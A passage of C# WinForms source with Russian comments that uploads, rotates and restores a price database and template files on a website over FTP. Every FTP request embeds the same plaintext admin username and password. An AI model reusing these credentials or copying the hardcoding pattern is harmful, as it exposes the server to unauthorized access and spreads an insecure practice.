                                string url32 = url_praise + "/data_praise/шаблоны_1/" + список_файлов_в_папке[i];
                                FtpWebRequest requestDel8 = (FtpWebRequest)WebRequest.Create(url32);
                                requestDel8.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
                                requestDel8.Method = WebRequestMethods.Ftp.DeleteFile;
                                FtpWebResponse responseDel8 = null;
                                try
                                {
                                    responseDel8 = (FtpWebResponse)requestDel8.GetResponse();
                                    responseDel8.Close();
                                }
                                catch { } // если catch .. значит файла нет. это 550 ошибка       
                                try { responseDel8.Close(); } catch { }
                            }
                        }
                    }
                    catch
                    {
                        //папки нет!
                    }
                    //потом удаляем пустую папку! Если её нет ничего страшного
                    FtpWebRequest requestD = (FtpWebRequest)WebRequest.Create(url_praise + "/data_praise/шаблоны_1");
                    requestD.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
                    requestD.Method = WebRequestMethods.Ftp.RemoveDirectory;
                    FtpWebResponse responseD = null;
                    try { responseD = (FtpWebResponse)requestD.GetResponse(); } catch { }
                    try { responseD.Close(); } catch { }
                    responseD = null;
                    try { responseDel.Close(); } catch { }
                }
                button_upload_praise_ftp.Text = "Загрузить на сайт прайс"; ;
            }
        }
        private void date_upload_ftp_prase()
        {
            //проверяем фалы на компьютере
            string curFile = setting[4] + "\\Dahmira.mdf";
            bool q1 = File.Exists(curFile);
            string curFile2 = setting[4] + "\\Dahmira_log.ldf";
            bool q2 = File.Exists(curFile2);
            string curFile3 = setting[4] + "\\data.txt";
            bool q3 = File.Exists(curFile3);
            if (q1 == false || q2 == false || q3 == false)
            {
                MessageBox.Show("В папке не хватает файлов, операция остановленна", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                try { button_upload_praise_ftp.Invoke((MethodInvoker)delegate { button_upload_praise_ftp.Text = "Загрузить на сайт прайс"; }); } catch { }
                try { groupBox_url_praise.Invoke((MethodInvoker)delegate { groupBox_url_praise.Size = new Size(127, 100); }); } catch { }
                try { date_upload_ftp_prase_potok.Abort(); } catch { }
            }

            //перепишем data файл! 
            //пробую почитать файл у себя 
            string my_baza_put = setting[4] + "\\data.txt";
            string[] my_baza_data = new string[14];
            try
            {
                using (StreamReader stream = new StreamReader(my_baza_put))
                {
                    int c = 0;
                    while (stream.Peek() >= 0)
                    {
                        my_baza_data[c] = stream.ReadLine();
                        c++;
                    }
                    stream.Close();
                }
            }
            catch
            {
                MessageBox.Show("Не смогла почитать файл истории, повреждения", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            string[] myNeW = new string[7];
            if (my_baza_data[7] != null && my_baza_data[8] != null && my_baza_data[9] != null)
            {
                for (int i = 0; i < 7; i++)
                {
                    myNeW[i] = my_baza_data[i + 7];
                }
                try { System.IO.File.Delete(setting[4] + "\\data.txt"); } catch { } //удаляем файлы
                if (File.Exists(curFile3) == true)
                {
                    MessageBox.Show("Не смогла удалить файл истории", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    try { groupBox_url_praise.Invoke((MethodInvoker)delegate { groupBox_url_praise.Size = new Size(127, 100); }); } catch { }
                    try { date_upload_ftp_prase_potok.Abort(); } catch { }

                }
                DateTime mydate = DateTime.Now;
                try
                {
                    using (StreamWriter sw = new StreamWriter(setting[4] + "\\data.txt", false, System.Text.Encoding.UTF8))
                    {
                        for (int i = 0; i < 6; i++)
                        {
                            sw.WriteLine(myNeW[i]);
                        }
                        sw.Write(myNeW[6]);
                        sw.Close();
                    }
                }
                catch
                {
                    MessageBox.Show("Не смогла переписать файл истории", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
            }
            //всё. можно грузить на сервер! 
            for (int i = 0; i < 3; i++)
            {
                //запись потока на сервер
                FileInfo fileInf = null;
                string uri = "";
                switch (i)
                {
                    case 0:
                        fileInf = new FileInfo(setting[4] + "\\Dahmira.mdf");
                        uri = url_praise + "/data_praise/Dahmira1.mdf";
                        break;
                    case 1:
                        fileInf = new FileInfo(setting[4] + "\\Dahmira_log.ldf");
                        uri = url_praise + "/data_praise/Dahmira_log1.ldf";
                        break;
                    case 2:
                        fileInf = new FileInfo(setting[4] + "\\data.txt");
                        uri = url_praise + "/data_praise/data1.txt";
                        break;
                }


                FtpWebRequest reqFTP;
                // Создаем объект FtpWebRequest
                reqFTP = (FtpWebRequest)FtpWebRequest.Create(new Uri(uri));
                // Учетная запись
                reqFTP.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
                reqFTP.KeepAlive = false;
                // Задаем команду на закачку
                reqFTP.Method = WebRequestMethods.Ftp.UploadFile;
                // Тип передачи файла
                reqFTP.UseBinary = true;
                // Сообщаем серверу о размере файла
                reqFTP.ContentLength = fileInf.Length;
                // Буффер в 2 кбайт
                int buffLength = 2048;
                int trask = 0;
                byte[] buff = new byte[buffLength];
                int contentLen;
                // Файловый поток
                FileStream fs = fileInf.OpenRead();
                try { progressBar1.Invoke((MethodInvoker)delegate { progressBar1.Visible = true; }); } catch { }
                try { progressBar1.Invoke((MethodInvoker)delegate { progressBar1.Minimum = 0; }); } catch { }
                try { progressBar1.Invoke((MethodInvoker)delegate { progressBar1.Maximum = Convert.ToInt32(fileInf.Length); }); } catch { }
                try { label_bite.Invoke((MethodInvoker)delegate { label_bite.Visible = true; }); } catch { }
                string gmbit = FormatBytes(fileInf.Length);
                try { label_bite.Invoke((MethodInvoker)delegate { label_bite.Text = (i + 1).ToString() + "/3 выгрузка" + " " + gmbit; }); } catch { }
                try
                {
                    Stream strm = reqFTP.GetRequestStream();
                    // Читаем из потока по 2 кбайт
                    contentLen = fs.Read(buff, 0, buffLength);
                    // Пока файл не кончится
                    while (contentLen != 0)
                    {
                        strm.Write(buff, 0, contentLen);
                        contentLen = fs.Read(buff, 0, buffLength);
                        trask = trask + buffLength;
                        if (trask < progressBar1.Maximum) try { progressBar1.Invoke((MethodInvoker)delegate { progressBar1.Value = trask; }); } catch { }
                        if (button_upload_praise_ftp.Text != "Отмена") { contentLen = 0; }//Если нажали отмена, то убиваем процесс!
                    }
                    // Закрываем потоки
                    strm.Close();
                    fs.Close();
                    try { progressBar1.Invoke((MethodInvoker)delegate { progressBar1.Visible = false; }); } catch { }

                }
                catch (Exception ex)
                {
                    try { fs.Close(); } catch { }
                    MessageBox.Show(ex.Message, "Остановка процесса выгрузки");
                    try { button_upload_praise_ftp.Invoke((MethodInvoker)delegate { button_upload_praise_ftp.Text = "Загрузить на сайт прайс"; }); } catch { }
                    //если ошибка, то надо по удалять все и файлы и глушить процесс
                    try { progressBar1.Invoke((MethodInvoker)delegate { progressBar1.Visible = false; }); } catch { }
                    try { label_bite.Invoke((MethodInvoker)delegate { label_bite.Visible = false; }); } catch { }
                    i = 3;
                    string uri2 = "";
                    for (int e = 0; e < 3; e++)
                    {
                        switch (e)
                        {
                            case 0:
                                uri2 = url_praise + "/data_praise/Dahmira1.mdf";
                                break;
                            case 1:
                                uri2 = url_praise + "/data_praise/Dahmira_log1.ldf";
                                break;
                            case 2:
                                uri2 = url_praise + "/data_praise/data1.txt";
                                break;
                        }
                        FtpWebRequest requestDel = (FtpWebRequest)WebRequest.Create(uri2);
                        requestDel.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
                        requestDel.Method = WebRequestMethods.Ftp.DeleteFile;
                        FtpWebResponse responseDel = null;
                        try
                        {
                            responseDel = (FtpWebResponse)requestDel.GetResponse();
                            responseDel.Close();
                        }
                        catch { } // если catch .. значит файла нет. это 550 ошибка       
                        try { responseDel.Close(); } catch { }
                    }
                    try { button_upload_praise_ftp.Invoke((MethodInvoker)delegate { button_upload_praise_ftp.Text = "Загрузить на сайт прайс"; }); } catch { }
                    try { groupBox_url_praise.Invoke((MethodInvoker)delegate { groupBox_url_praise.Size = new Size(127, 100); }); } catch { }
                    try { date_upload_ftp_prase_potok.Abort(); } catch { }

                }
            }
            // с файлами всё. Теперь шаблоны.
            //проверяем, а есть ли шаблоны. 


            bool а_есть_ли_шаблоны = false;
            а_есть_ли_шаблоны = Directory.Exists(setting[4] + "\\шаблоны");
            if (а_есть_ли_шаблоны == false) goto ненадо;


            List<string> testing_a = new List<string>();
            foreach (string f in Directory.GetFiles(setting[4] + "\\шаблоны"))
            { testing_a.Add(f); }
            if (testing_a.Count == 0) { goto ненадо; }
            //получаем список файлов 

            //пробуем удалить папку на ftp. удаляем папку темп. Вдруг не докачалась с прошлго раза
            //вначале надо получить список файлов внутри и удалить их

            //получаем список файлов на сайте! 
            List<string> список_файлов_в_папке = new List<string>();
            string ftpUri = url_praise + "/data_praise/шаблоны_1/";
            var ftpWebRequest = (FtpWebRequest)WebRequest.Create(new Uri(ftpUri));
            ftpWebRequest.Method = WebRequestMethods.Ftp.ListDirectoryDetails;
            ftpWebRequest.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
            FtpWebResponse ftpWebResponse = null;
            try
            {
                ftpWebResponse = (FtpWebResponse)ftpWebRequest.GetResponse();
                Stream stream = ftpWebResponse.GetResponseStream();
                StreamReader streamReader = new StreamReader(stream, System.Text.Encoding.UTF8);

                List<string> files = new List<string>();
                string fileList;
                string[] fileName;
                while (!streamReader.EndOfStream)
                {
                    fileList = streamReader.ReadLine();
                    fileName = fileList.Split(' ');
                    if (fileName[0] == "-rw-r--r--")
                    {
                        int thk = 0;
                        for (int i = 0; i < fileName.Length; i++)
                        {
                            var regex = new Regex(@"\b(?:[01][0-9]|2[0-3]):[0-5][0-9]\b");
                            var matches = regex.Matches(fileName[i]).Cast<Match>().Select(x => x.Value);
                            foreach (var match in matches)
                            {
                                i = fileName.Length;
                            }
                            thk++;
                        }

                        string namess = "";
                        for (int i = thk; i < fileName.Length; i++)
                        {
                            namess = namess + fileName[i];
                            if (i < fileName.Length - 1) { namess = namess + " "; }
                        }
                        список_файлов_в_папке.Add(namess);
                    }
                }

                try { ftpWebResponse.Close(); } catch { }
                //папка есть но файлов нет
                if (список_файлов_в_папке.Count > 0)
                {
                    for (int i = 0; i < список_файлов_в_папке.Count; i++)
                    {
                        string url32 = url_praise + "/data_praise/шаблоны_1/" + список_файлов_в_папке[i];
                        FtpWebRequest requestDel = (FtpWebRequest)WebRequest.Create(url32);
                        requestDel.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
                        requestDel.Method = WebRequestMethods.Ftp.DeleteFile;
                        FtpWebResponse responseDel = null;
                        try
                        {
                            responseDel = (FtpWebResponse)requestDel.GetResponse();
                            responseDel.Close();
                        }
                        catch { } // если catch .. значит файла нет. это 550 ошибка       
                        try { responseDel.Close(); } catch { }
                    }
                }
            } catch
            {
                //папки нет!
            }

            //потом удаляем пустую папку! Если её нет ничего страшного
            FtpWebRequest requestD = (FtpWebRequest)WebRequest.Create(url_praise + "/data_praise/шаблоны_1");
            requestD.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
            requestD.Method = WebRequestMethods.Ftp.RemoveDirectory;
            FtpWebResponse responseD = null;
            try { responseD = (FtpWebResponse)requestD.GetResponse(); } catch { }
            try { responseD.Close(); } catch { }
            responseD = null;


            //создаем новую
            requestD = (FtpWebRequest)WebRequest.Create(url_praise + "/data_praise/шаблоны_1");
            requestD.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
            requestD.Method = WebRequestMethods.Ftp.MakeDirectory;
            try { responseD = (FtpWebResponse)requestD.GetResponse(); } catch { }
            try { responseD.Close(); } catch { }

            // качаем на сайт 


            for (int i = 0; i < testing_a.Count; i++)
            {

                //запись потока на сервер
                FileInfo fileInf1 = null;
                string uri = "";

                fileInf1 = new FileInfo(testing_a[i]);
                uri = url_praise + "/data_praise/шаблоны_1/" + fileInf1.Name;

                FtpWebRequest reqFTP2;
                // Создаем объект FtpWebRequest
                reqFTP2 = (FtpWebRequest)FtpWebRequest.Create(new Uri(uri));
                // Учетная запись
                reqFTP2.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
                reqFTP2.KeepAlive = false;
                // Задаем команду на закачку
                reqFTP2.Method = WebRequestMethods.Ftp.UploadFile;
                // Тип передачи файла
                reqFTP2.UseBinary = true;
                // Сообщаем серверу о размере файла
                reqFTP2.ContentLength = fileInf1.Length;
                // Буффер в 2 кбайт
                int buffLength2 = 2048;
                int trask2 = 0;
                byte[] buff = new byte[buffLength2];
                int contentLen2;
                // Файловый поток
                FileStream fs2 = fileInf1.OpenRead();
                try { progressBar1.Invoke((MethodInvoker)delegate { progressBar1.Visible = true; }); } catch { }
                try { progressBar1.Invoke((MethodInvoker)delegate { progressBar1.Minimum = 0; }); } catch { }
                try { progressBar1.Invoke((MethodInvoker)delegate { progressBar1.Maximum = Convert.ToInt32(fileInf1.Length); }); } catch { }
                try { label_bite.Invoke((MethodInvoker)delegate { label_bite.Visible = true; }); } catch { }

                string gmbit = FormatBytes(fileInf1.Length);
                try { label_bite.Invoke((MethodInvoker)delegate { label_bite.Text = (i + 1).ToString() + "/" + testing_a.Count.ToString() + " шаблоны" + " " + gmbit; }); } catch { }
                try
                {
                    Stream strm2 = reqFTP2.GetRequestStream();
                    // Читаем из потока по 2 кбайт
                    contentLen2 = fs2.Read(buff, 0, buffLength2);
                    // Пока файл не кончится
                    while (contentLen2 != 0)
                    {
                        strm2.Write(buff, 0, contentLen2);
                        contentLen2 = fs2.Read(buff, 0, buffLength2);
                        trask2 = trask2 + buffLength2;
                        if (trask2 < progressBar1.Maximum) try { progressBar1.Invoke((MethodInvoker)delegate { progressBar1.Value = trask2; }); } catch { }
                        if (button_upload_praise_ftp.Text != "Отмена") { contentLen2 = 0; }//Если нажали отмена, то убиваем процесс!
                    }
                    // Закрываем потоки
                    strm2.Close();
                    fs2.Close();
                    try { progressBar1.Invoke((MethodInvoker)delegate { progressBar1.Visible = false; }); } catch { }
                }
                catch (Exception ex)
                {
                    // Если затыл то всё удаляем! 

                    try { fs2.Close(); } catch { }
                    MessageBox.Show(ex.Message, "Остановка процесса выгрузки");


                    // удаляем базу 
                    try { button_upload_praise_ftp.Invoke((MethodInvoker)delegate { button_upload_praise_ftp.Text = "Загрузить на сайт прайс"; }); } catch { }
                    //если ошибка, то надо по удалять все и файлы и глушить процесс
                    try { progressBar1.Invoke((MethodInvoker)delegate { progressBar1.Visible = false; }); } catch { }
                    try { label_bite.Invoke((MethodInvoker)delegate { label_bite.Visible = false; }); } catch { }
                    i = 3;
                    string uri2 = "";
                    for (int e = 0; e < 3; e++)
                    {
                        switch (e)
                        {
                            case 0:
                                uri2 = url_praise + "/data_praise/Dahmira1.mdf";
                                break;
                            case 1:
                                uri2 = url_praise + "/data_praise/Dahmira_log1.ldf";
                                break;
                            case 2:
                                uri2 = url_praise + "/data_praise/data1.txt";
                                break;
                        }
                        FtpWebRequest requestDel = (FtpWebRequest)WebRequest.Create(uri2);
                        requestDel.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
                        requestDel.Method = WebRequestMethods.Ftp.DeleteFile;
                        FtpWebResponse responseDel = null;
                        try
                        {
                            responseDel = (FtpWebResponse)requestDel.GetResponse();
                            responseDel.Close();
                        }
                        catch { } // если catch .. значит файла нет. это 550 ошибка       
                        try { responseDel.Close(); } catch { }
                    }
                    // удаляем шаблоны

                    //пробуем удалить папку на ftp. удаляем папку темп. потому что откат
                    FtpWebRequest requestD2 = (FtpWebRequest)WebRequest.Create(url_praise + "/data_praise/шаблоны_1");
                    requestD2.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
                    requestD2.Method = WebRequestMethods.Ftp.RemoveDirectory;
                    FtpWebResponse responseD2 = null;
                    try
                    {
                        responseD2 = (FtpWebResponse)requestD2.GetResponse();
                        responseD2.Close();
                    }
                    catch { }
                    responseD2 = null;
                    //прячим и тушим
                    try { button_upload_praise_ftp.Invoke((MethodInvoker)delegate { button_upload_praise_ftp.Text = "Загрузить на сайт прайс"; }); } catch { }
                    try { groupBox_url_praise.Invoke((MethodInvoker)delegate { groupBox_url_praise.Size = new Size(127, 100); }); } catch { }
                    try { date_upload_ftp_prase_potok.Abort(); } catch { }
                }
            }

            //Всё хорошо на сайт залилось.. Теперь надо по переименовывать и грохнуть историю
            // удаляем на сайте историю        
            //вначале надо получить список файлов внутри и удалить их

            //получаем список файлов на сайте! 
            List<string> список_файлов_в_папке1 = new List<string>();
            string ftpUri1 = url_praise + "/data_praise/шаблоны_history/";
            var ftpWebRequest1 = (FtpWebRequest)WebRequest.Create(new Uri(ftpUri1));
            ftpWebRequest1.Method = WebRequestMethods.Ftp.ListDirectoryDetails;
            ftpWebRequest1.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
            FtpWebResponse ftpWebResponse1 = null;
            try
            {
                ftpWebResponse1 = (FtpWebResponse)ftpWebRequest1.GetResponse();
                Stream stream = ftpWebResponse1.GetResponseStream();
                StreamReader streamReader = new StreamReader(stream, System.Text.Encoding.UTF8);

                List<string> files = new List<string>();
                string fileList;
                string[] fileName;
                while (!streamReader.EndOfStream)
                {
                    fileList = streamReader.ReadLine();
                    fileName = fileList.Split(' ');
                    if (fileName[0] == "-rw-r--r--")
                    {
                        int thk = 0;
                        for (int i = 0; i < fileName.Length; i++)
                        {
                            var regex = new Regex(@"\b(?:[01][0-9]|2[0-3]):[0-5][0-9]\b");
                            var matches = regex.Matches(fileName[i]).Cast<Match>().Select(x => x.Value);
                            foreach (var match in matches)
                            {
                                i = fileName.Length;
                            }
                            thk++;
                        }

                        string namess = "";
                        for (int i = thk; i < fileName.Length; i++)
                        {
                            namess = namess + fileName[i];
                            if (i < fileName.Length - 1) { namess = namess + " "; }
                        }
                        список_файлов_в_папке.Add(namess);
                    }
                }
                try { ftpWebResponse1.Close(); } catch { }
                //папка есть но файлов нет
                if (список_файлов_в_папке.Count > 0)
                {
                    for (int i = 0; i < список_файлов_в_папке.Count; i++)
                    {
                        string url32 = url_praise + "/data_praise/шаблоны_history/" + список_файлов_в_папке[i];
                        FtpWebRequest requestDel = (FtpWebRequest)WebRequest.Create(url32);
                        requestDel.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
                        requestDel.Method = WebRequestMethods.Ftp.DeleteFile;
                        FtpWebResponse responseDel = null;
                        try
                        {
                            responseDel = (FtpWebResponse)requestDel.GetResponse();
                            responseDel.Close();
                        }
                        catch { } // если catch .. значит файла нет. это 550 ошибка       
                        try { responseDel.Close(); } catch { }
                    }
                }




            }
            catch
            {
                //папки нет!
            }

            //потом удаляем пустую папку! Если её нет ничего страшного
            FtpWebRequest requestD1 = (FtpWebRequest)WebRequest.Create(url_praise + "/data_praise/шаблоны_history");
            requestD1.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
            requestD1.Method = WebRequestMethods.Ftp.RemoveDirectory;
            FtpWebResponse responseD1 = null;
            try { responseD1 = (FtpWebResponse)requestD.GetResponse(); } catch { }
            try { responseD1.Close(); } catch { }
            responseD1 = null;



            //переименновываем папку рабочую в историю
            FtpWebRequest client333 = (FtpWebRequest)FtpWebRequest.Create(url_praise + "/data_praise/шаблоны");
            client333.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
            client333.Method = WebRequestMethods.Ftp.Rename;
            client333.RenameTo = "шаблоны_history";
            try { FtpWebResponse response333 = (FtpWebResponse)client333.GetResponse(); // вот тут ошибку выдает
                Stream ftpStream333 = response333.GetResponseStream();
                response333.Close();
            } catch { }


            FtpWebRequest client334 = (FtpWebRequest)FtpWebRequest.Create(url_praise + "/data_praise/шаблоны_1");
            client334.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
            client334.Method = WebRequestMethods.Ftp.Rename;
            client334.RenameTo = "шаблоны";
            try
            { FtpWebResponse response334 = (FtpWebResponse)client334.GetResponse(); // вот тут ошибку выдает
                Stream ftpStream334 = response334.GetResponseStream();
                response334.Close();
            }
            catch { }

            // переименновываем темп в рабочую

            ненадо:

            //если до сюда добрались то надо по удалять и по переименовывать файлы на сайте! 
            //удаление истории
            string uri1 = "";
            for (int i = 0; i < 3; i++)
            {
                switch (i)
                {
                    case 0:
                        uri1 = url_praise + "/data_praise/Dahmira_history.mdf";
                        break;
                    case 1:
                        uri1 = url_praise + "/data_praise/Dahmira_log_history.ldf";
                        break;
                    case 2:
                        uri1 = url_praise + "/data_praise/data_history.txt";
                        break;
                }
                FtpWebRequest requestDel = (FtpWebRequest)WebRequest.Create(uri1);
                requestDel.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
                requestDel.Method = WebRequestMethods.Ftp.DeleteFile;
                FtpWebResponse responseDel = null;
                try
                {
                    responseDel = (FtpWebResponse)requestDel.GetResponse();
                    responseDel.Close();
                }
                catch { } // если catch .. значит файла нет. это 550 ошибка       
            }
            //текущие файлы, (если есть) переименновываем в историю! 
            for (int i = 0; i < 3; i++)
            {
                switch (i)
                {
                    case 0:
                        uri1 = url_praise + "/data_praise/Dahmira.mdf";
                        break;
                    case 1:
                        uri1 = url_praise + "/data_praise/Dahmira_log.ldf";
                        break;
                    case 2:
                        uri1 = url_praise + "/data_praise/data.txt";
                        break;
                }


                FtpWebRequest client = (FtpWebRequest)FtpWebRequest.Create(new Uri(uri1));
                client.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
                client.Method = WebRequestMethods.Ftp.Rename;
                if (i == 0) client.RenameTo = "Dahmira_history.mdf";
                if (i == 1) client.RenameTo = "Dahmira_log_history.ldf";
                if (i == 2) client.RenameTo = "data_history.txt";
                try
                {
                    FtpWebResponse response = (FtpWebResponse)client.GetResponse(); // вот тут ошибку выдает
                    Stream ftpStream = response.GetResponseStream();
                    response.Close();
                }
                catch { i = 3; } //нет истории, можно не продалжать
            }

            //Ну и финалочка, переименновываем в рабочее, то что залили! Ура! 

            for (int i = 0; i < 3; i++)
            {
                switch (i)
                {
                    case 0:
                        uri1 = url_praise + "/data_praise/Dahmira1.mdf";
                        break;
                    case 1:
                        uri1 = url_praise + "/data_praise/Dahmira_log1.ldf";
                        break;
                    case 2:
                        uri1 = url_praise + "/data_praise/data1.txt";
                        break;
                }
                FtpWebRequest client = (FtpWebRequest)FtpWebRequest.Create(new Uri(uri1));
                client.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
                client.Method = WebRequestMethods.Ftp.Rename;
                if (i == 0) client.RenameTo = "Dahmira.mdf";
                if (i == 1) client.RenameTo = "Dahmira_log.ldf";
                if (i == 2) client.RenameTo = "data.txt";
                try
                {
                    FtpWebResponse response = (FtpWebResponse)client.GetResponse(); // вот тут ошибку выдает
                    Stream ftpStream = response.GetResponseStream();
                    response.Close();
                }
                catch
                {
                    MessageBox.Show("Значит, смотри. Я залила копию удачно, удалила рабочий прайс, а за это время кто то вздернул копию. И рабочей я её сделать не смогла. Нужно участие админа! Звони!", "Пиздец!");
                }
            }
            try { label_bite.Invoke((MethodInvoker)delegate { label_bite.Visible = false; }); } catch { }
            try { button_upload_praise_ftp.Invoke((MethodInvoker)delegate { button_upload_praise_ftp.Text = "Загрузить на сайт прайс"; }); } catch { }
            try { groupBox_url_praise.Invoke((MethodInvoker)delegate { groupBox_url_praise.Size = new Size(127, 100); }); } catch { }





            //удалим файл истории 

            try { System.IO.File.Delete(setting[4] + "\\My_history_work_" + setting[3] + ".txt"); } catch { }


            try { date_upload_ftp_prase_potok.Abort(); } catch { }


        }

        //ВОСТОНОВИТЬ на сайте. 
        Thread date_return_ftp_prase_potok;
        private void button_return_ftp_praise_Click(object sender, EventArgs e)
        {
            if (setting[6] != "true") { MessageBox.Show("Вы не можете пользоваться данной опцией.\nПерейдит в настройки и проидите\nаутентификация пользователя!"); return; }

            if (button5.Text == "Отмена" || button_upload_praise_ftp.Text == "Отмена") { MessageBox.Show("Отмените другие действия!", "Не-а!"); return; }

            if (proverka_key() == false)
            {
                //ключ гофно
                return;
            }
            if (button_return_ftp_praise.Text == "Восстановить прайс")
            {
                if (date_return_ftp_prase_potok == null || date_return_ftp_prase_potok.ThreadState == System.Threading.ThreadState.Stopped || date_return_ftp_prase_potok.ThreadState == System.Threading.ThreadState.Aborted)
                {
                    if (MessageBox.Show("Точно уверен?", "", MessageBoxButtons.OKCancel) == DialogResult.Cancel) { return; }
                    progressBar1.Visible = true;
                    label_bite.Visible = true;
                    date_return_ftp_prase_potok = new Thread(date_return_ftp_prase);
                    date_return_ftp_prase_potok.Start();
                    button_return_ftp_praise.Text = "Отмена";                  
                }
            }
            else
            {
                button_return_ftp_praise.Text = "Восстановить прайс";
                try { date_return_ftp_prase_potok.Abort(); } catch { }
                progressBar1.Visible = false;
                label_bite.Visible = false;
            }

        }

        private void date_return_ftp_prase()
        {
            bool okey = false;

            for (int i = 0; i < 3; i++)
            {
                if (okey == false)
                {

                    string uri6 = "";
                    switch (i)
                    {
                        case 0:
                            uri6 = url_praise + "/data_praise/Dahmira_history.mdf";
                            break;
                        case 1:
                            uri6 = url_praise + "/data_praise/Dahmira_log_history.ldf";
                            break;
                        case 2:
                            uri6 = url_praise + "/data_praise/data_history.txt";
                            break;
                    }
                    Uri ourUri = new Uri(uri6);
                    FtpWebRequest request = (FtpWebRequest)WebRequest.Create(ourUri);
                    request.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
                    request.Method = WebRequestMethods.Ftp.GetFileSize;
                    try
                    {
                        FtpWebResponse response = (FtpWebResponse)request.GetResponse();

                        //THE FILE EXISTS 
                        okey = false;

                    }
                    catch (WebException ex)
                    {
                        FtpWebResponse response = (FtpWebResponse)ex.Response;
                        if (FtpStatusCode.ActionNotTakenFileUnavailable == response.StatusCode)
                        {
                            // THE FILE DOES NOT EXIST 
                            okey = true;
                        }
                    }

                }
            }



            if (okey == false)
            { //всё хорошо, есть фалы все! 

                //Читаем файл истории и докладываем, о чём идет речь

                string url = url_praise + "/data_praise/data_history.txt";
                string[] messenges = null;
                FtpWebRequest request = (FtpWebRequest)WebRequest.Create(url);
                request.Method = WebRequestMethods.Ftp.DownloadFile;
                request.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
                FtpWebResponse response = null;
                try { response = (FtpWebResponse)request.GetResponse(); } catch { MessageBox.Show("Нет соединения с фалом сайта\nПопробуйте позже.", "Ошибка"); try { date_time_ftp_prase_potok.Abort(); } catch { } }
                Stream responseStream = response.GetResponseStream();
                StreamReader reader = new StreamReader(responseStream);
                messenges = reader.ReadToEnd().Split(
                new[] { "\r\n", "\r", "\n" },
                  StringSplitOptions.None
                 );
                reader.Close();
                response.Close();


                DialogResult решение = MessageBox.Show("На сайте, в история есть следующий прайс:\n" +
                    "Составил: " + messenges[6] + "\n" +
                    "Дата создания: " + messenges[3] + "/" + messenges[4] + "/" + messenges[5] + "\n" +
                    "Время: " + messenges[0] + ":" + messenges[1] + ":" + messenges[2] + "\n" +
                    "Продолжаем, да?\n......................\nГрохнуть действующий прайс,\nи этот выше сделать рабочим!\n Даю согласие!\n......................\nВсё верно?"
                    , "Уточнение!", MessageBoxButtons.YesNo, MessageBoxIcon.Information);

                if (решение == DialogResult.Yes)
                {
                    //грохаем текущий прайс.
                    //удаление 
                    string uri1 = "";
                    for (int i = 0; i < 3; i++)
                    {
                        switch (i)
                        {
                            case 0:
                                uri1 = url_praise + "/data_praise/Dahmira.mdf";
                                break;
                            case 1:
                                uri1 = url_praise + "/data_praise/Dahmira_log.ldf";
                                break;
                            case 2:
                                uri1 = url_praise + "/data_praise/data.txt";
                                break;
                        }
                        FtpWebRequest requestDel = (FtpWebRequest)WebRequest.Create(uri1);
                        requestDel.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
                        requestDel.Method = WebRequestMethods.Ftp.DeleteFile;
                        FtpWebResponse responseDel = null;
                        try
                        {
                            responseDel = (FtpWebResponse)requestDel.GetResponse();
                            responseDel.Close();
                        }
                        catch { } // если catch .. значит файла нет. это 550 ошибка       
                    }
                    //переименовываю рабочую историю
                    for (int i = 0; i < 3; i++)
                    {
                        switch (i)
                        {
                            case 0:
                                uri1 = url_praise + "/data_praise/Dahmira_history.mdf";
                                break;
                            case 1:
                                uri1 = url_praise + "/data_praise/Dahmira_log_history.ldf";
                                break;
                            case 2:
                                uri1 = url_praise + "/data_praise/data_history.txt";
                                break;
                        }
                        FtpWebRequest client = (FtpWebRequest)FtpWebRequest.Create(new Uri(uri1));
                        client.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
                        client.Method = WebRequestMethods.Ftp.Rename;
                        if (i == 0) client.RenameTo = "Dahmira.mdf";
                        if (i == 1) client.RenameTo = "Dahmira_log.ldf";
                        if (i == 2) client.RenameTo = "data.txt";
                        try
                        {
                            FtpWebResponse response9 = (FtpWebResponse)client.GetResponse(); // вот тут ошибку выдает
                            Stream ftpStream = response9.GetResponseStream();
                            response9.Close();
                        }
                        catch
                        {
                            MessageBox.Show("Значит, смотри. Я не смогла переименновать файлы истории в рабочее. Нужно участие админа! Звони!", "Пиздец!");
                        }
                    }


                    //шаблоны. Удаляем файл шаблонов рабочий
                    //получаем список файлов на сайте! 
                    List<string> список_файлов_в_папке = new List<string>();
                    string ftpUri = url_praise + "/data_praise/шаблоны/";
                    var ftpWebRequest = (FtpWebRequest)WebRequest.Create(new Uri(ftpUri));
                    ftpWebRequest.Method = WebRequestMethods.Ftp.ListDirectoryDetails;
                    ftpWebRequest.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
                    FtpWebResponse ftpWebResponse = null;
                    try
                    {
                        ftpWebResponse = (FtpWebResponse)ftpWebRequest.GetResponse();
                        Stream stream = ftpWebResponse.GetResponseStream();
                        StreamReader streamReader = new StreamReader(stream, System.Text.Encoding.UTF8);
